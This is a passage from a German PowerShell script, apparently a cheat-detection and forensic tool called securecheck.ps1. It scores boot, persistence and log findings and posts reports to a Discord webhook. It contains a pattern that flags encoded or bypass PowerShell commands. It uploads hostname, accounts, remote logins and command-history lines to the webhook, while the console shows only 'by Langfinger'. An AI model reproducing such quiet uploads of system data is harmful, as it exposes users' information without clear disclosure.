$e2Color = if (($wmiFindings.Count + $remoteLogins.Count + $runKeySuspect.Count + $pfSuspicious.Count) -gt 0) { 15158332 } else { 3066993 }
$embed2 = [ordered]@{
    title  = ":mag: Forensik-Analyse | $Hostname"
    color  = $e2Color
    fields = @(
        [ordered]@{ name = "F1 Prefetch / verdaechtige Exe"; value = $f1Field; inline = $false }
        [ordered]@{ name = "F3 WMI Subscriptions";           value = $f3Field; inline = $false }
        [ordered]@{ name = "F4 Registry Run-Keys";           value = $f4Field; inline = $false }
        [ordered]@{ name = "F5 Benutzerkonten";              value = $f5Field; inline = $false }
        [ordered]@{ name = "F6 Remote-Logins (4624)";        value = $f6Field; inline = $false }
    )
    footer = [ordered]@{ text = "securecheck.ps1" }
}

# --- Embed 3: Geplante Tasks ---
$taskLines = if ($suspTasks.Count -gt 0) {
    $v = ""
    $suspTasks | ForEach-Object { $v += "$_`n`n" }
    $v.TrimEnd()
} else { ":white_check_mark: $taskStatus" }
if ($taskLines.Length -gt 4096) { $taskLines = $taskLines.Substring(0,4090) + "..." }
$e3Color = if ($suspTasks.Count -gt 0) { 16098851 } else { 3066993 }   # Orange oder Gruen
$embed3 = [ordered]@{
    title       = ":calendar: Geplante Tasks (ausserhalb Windows) | $Hostname"
    description = if ($suspTasks.Count -gt 0) { ":warning: **$($suspTasks.Count) Tasks gefunden**`n${tb}`n$taskLines`n${tb}" } else { ":white_check_mark: $taskStatus" }
    color       = $e3Color
    footer      = [ordered]@{ text = "securecheck.ps1" }
}

# --- Embed 4: Defender Threats ---
$defLines = if ($defThreats.Count -gt 0) {
    $v = ""
    $defThreats | ForEach-Object { $v += "$_`n" }
    $v.TrimEnd()
} else { "" }
$e4Color = if ($defThreats.Count -gt 0) { 15158332 } else { 3066993 }
$e4Desc = if ($defThreats.Count -gt 0) {
    $d = ":rotating_light: **$($defThreats.Count) Threats gefunden**`n${tb}`n$defLines`n${tb}"
    if ($d.Length -gt 4096) { $d.Substring(0,4090) + "..." } else { $d }
} else { ":white_check_mark: $defThreatStatus" }
$embed4 = [ordered]@{
    title       = ":biohazard: Defender Threat History | $Hostname"
    description = $e4Desc
    color       = $e4Color
    footer      = [ordered]@{ text = "securecheck.ps1" }
}

# --- Embed 5: PowerShell History ---
$psLines = if ($psHistory.Count -gt 0) {
    $v = ""
    $psHistory | ForEach-Object { $v += "$_`n" }

    $v.TrimEnd()
} else { "" }
$e5Color = if ($psHistory.Count -gt 0) { 16098851 } else { 3066993 }
$e5Desc = if ($psHistory.Count -gt 0) {
    $d = ":warning: **$($psHistory.Count) verdaechtige Befehle gefunden** _($psHistoryStatus)_`n${tb}`n$psLines`n${tb}"
    if ($d.Length -gt 4096) { $d.Substring(0,4090) + "..." } else { $d }
} else { ":white_check_mark: $psHistoryStatus" }
$embed5 = [ordered]@{
    title       = ":scroll: PowerShell Command History | $Hostname"
    description = $e5Desc
    color       = $e5Color
    footer      = [ordered]@{ text = "securecheck.ps1" }
}

# --- Embed 6: Gefahrenstufe / Abschlussbewertung ---
$score     = 0
$findings  = [System.Collections.Generic.List[string]]::new()
$cheatHint = [System.Collections.Generic.List[string]]::new()

# UEFI/Boot Scoring
if (-not $secureBootOk)          { $score += 2; $findings.Add(":x: Secure Boot deaktiviert") }
if ($regSuspicious)              { $score += 5; $findings.Add(":rotating_light: IntegrityServices: Integrity-Checks deaktiviert ($($regSuspDetails -join ', '))"); $cheatHint.Add("Deaktivierte Integrity-Checks = gezielte UEFI/Bootpfad-Manipulation") }
if ($efiSuspicious.Count -gt 0)  { $score += 4; $findings.Add(":rotating_light: $($efiSuspicious.Count) fremde EFI-Datei(en)"); $cheatHint.Add("Fremde EFI-Dateien = klassischer UEFI-Cheat-Vektor") }
if (-not $bcdOk)                 { $score += 4; $findings.Add(":rotating_light: Verdaechtige BCD-Booteintraege"); $cheatHint.Add("Fremder BCD-Booteintrag = Bootloader-Cheat oder Backdoor") }
if ($bootmgfwSuspect)            { $score += 5; $findings.Add(":rotating_light: bootmgfw.efi Signatur ungueltig/manipuliert"); $cheatHint.Add("Gepatchter Bootmanager = hoechste Cheater-Indikation") }
if ($sbKeySuspicious)            { $score += 3; $findings.Add(":warning: Fremde Secure Boot Keys eingetragen") }
if ($suspiciousDrivers.Count -gt 0){ $score += 2; $findings.Add(":warning: $($suspiciousDrivers.Count) auffaellige Boot-Treiber") }

# Forensik Scoring
if ($wmiFindings.Count -gt 0)    { $score += 5; $findings.Add(":rotating_light: WMI Backdoor Subscriptions gefunden"); $cheatHint.Add("WMI Subscription = aktive Backdoor/Persistenz") }
if ($defThreats.Count -gt 0)     { $score += 3; $findings.Add(":rotating_light: Defender hat $($defThreats.Count) Threat(s) erkannt") }
if ($remoteLogins.Count -gt 0)   { $score += 2; $findings.Add(":warning: $($remoteLogins.Count) externe Remote-Logins im Log") }
if ($runKeySuspect.Count -gt 0)  { $score += 2; $findings.Add(":warning: $($runKeySuspect.Count) verdaechtige Autostart-Eintraege") }
if ($suspTasks.Count -gt 0)      { $score += 1; $findings.Add(":information_source: $($suspTasks.Count) geplante Tasks ausserhalb Windows") }
if ($psHistory.Count -gt 0)      { $score += 2; $findings.Add(":warning: $($psHistory.Count) verdaechtige PS-Befehle in History"); if ($psHistory -match 'bypass|FromBase64|-enc') { $cheatHint.Add("Encoded/Bypass PS-Befehle deuten auf Tool-Ausfuehrung hin") } }
if ($pfSuspicious.Count -gt 0)   { $score += 1; $findings.Add(":information_source: $($pfSuspicious.Count) verdaechtige Exe-Namen in Prefetch") }

# Gefahrenstufe bestimmen
$dangerLevel = switch ($true) {
    ($score -ge 12) { "KRITISCH"; break }
    ($score -ge 7)  { "HOCH"; break }
    ($score -ge 3)  { "MITTEL"; break }
    ($score -ge 1)  { "NIEDRIG"; break }
    default          { "KEINE" }
}
$dangerEmoji = switch ($dangerLevel) {
    "KRITISCH" { ":red_circle:" }
    "HOCH"     { ":orange_circle:" }
    "MITTEL"   { ":yellow_circle:" }
    "NIEDRIG"  { ":green_circle:" }
    default     { ":white_circle:" }
}
$cheatProb = switch ($true) {
    ($score -ge 12)                    { "SEHR WAHRSCHEINLICH :rotating_light:"; break }
    ($cheatHint.Count -ge 2 -or $score -ge 8) { "WAHRSCHEINLICH :warning:"; break }
    ($cheatHint.Count -ge 1 -or $score -ge 4) { "MOEGLICH :eyes:"; break }
    default                             { "UNWAHRSCHEINLICH :white_check_mark:" }
}

$summaryDesc  = "**Gefahrenstufe: $dangerEmoji $dangerLevel** (Score: $score)`n"
$summaryDesc += "**Cheat-Wahrscheinlichkeit: $cheatProb**`n`n"
if ($findings.Count -gt 0) {
    $summaryDesc += "**Gefundene Probleme:**`n"
    $findings | ForEach-Object { $summaryDesc += "$_`n" }
} else {
    $summaryDesc += ":white_check_mark: **Keine Auffaelligkeiten gefunden.**`n"
}
if ($cheatHint.Count -gt 0) {
    $summaryDesc += "`n**Cheat-Indikatoren:**`n"
    $cheatHint | ForEach-Object { $summaryDesc += ":small_orange_diamond: $_`n" }
}
if ($summaryDesc.Length -gt 4096) { $summaryDesc = $summaryDesc.Substring(0,4090) + "..." }

$e6Color = switch ($dangerLevel) {
    "KRITISCH" { 15158332 }
    "HOCH"     { 16098851 }
    "MITTEL"   { 16776960 }
    default     { 3066993 }
}
$embed6 = [ordered]@{
    title       = ":bar_chart: Abschlussbewertung | $Hostname"
    description = $summaryDesc
    color       = $e6Color
    footer      = [ordered]@{ text = "securecheck.ps1 | $Timestamp" }
}

# Konsolen-Gefahrenstufe


function Send-DiscordEmbeds($embedList) {
    $json  = [ordered]@{ embeds = $embedList } | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType 'application/json; charset=utf-8' -Body $bytes -ErrorAction Stop | Out-Null
        return $true
    } catch {
        $errMsg = $_.Exception.Message
        try {
            $respStream = $_.Exception.Response.GetResponseStream()
            $reader     = [System.IO.StreamReader]::new($respStream)
            $errMsg    += " | Discord: $($reader.ReadToEnd())"
            $reader.Dispose()
        } catch {}
        Write-Host "  FEHLER: $errMsg" -ForegroundColor Red
        return $false
    }
}



# Jedes Embed einzeln senden (vermeidet 6000-Zeichen-Gesamtlimit pro Request)
$allEmbeds  = @($embed1, $embed2, $embed3, $embed4, $embed5, $embed6)
$embedNames = @("UEFI/Boot", "Forensik", "Tasks", "Defender", "PS-History", "Bewertung")
$allOk = $true
for ($i = 0; $i -lt $allEmbeds.Count; $i++) {
    $ok = Send-DiscordEmbeds @($allEmbeds[$i])
    if ($ok) {
        Write-Host "by Langfinger" -ForegroundColor Green
    } else {
        Write-Host "by Langfinger" -ForegroundColor Red
        $allOk = $false
    }
    if ($i -lt ($allEmbeds.Count - 1)) { Start-Sleep -Milliseconds 600 }
}

if ($allOk) {
    
} else {
    
}


